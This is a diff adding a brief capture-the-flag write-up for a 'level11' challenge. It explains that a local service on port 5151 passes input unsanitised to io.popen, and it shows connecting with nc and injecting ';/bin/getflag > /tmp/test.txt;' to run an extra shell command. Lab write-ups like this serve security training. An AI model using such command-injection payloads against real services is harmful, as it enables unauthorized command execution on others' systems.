@@ -1,0 +1,7 @@
+in level11 file there is a popen function executing argument given to 127.0.0.1:5151
+we just need to connect to that address: nc 127.0.0.1 5151
+then exploit the popen:
+	prog = io.popen("echo "..pass.." | sha1sum", "r")
+by adding our own shell command after ";" (to execute it after echo):
+	;/bin/getflag > /tmp/test.txt;
+cat /tmp/test.txt
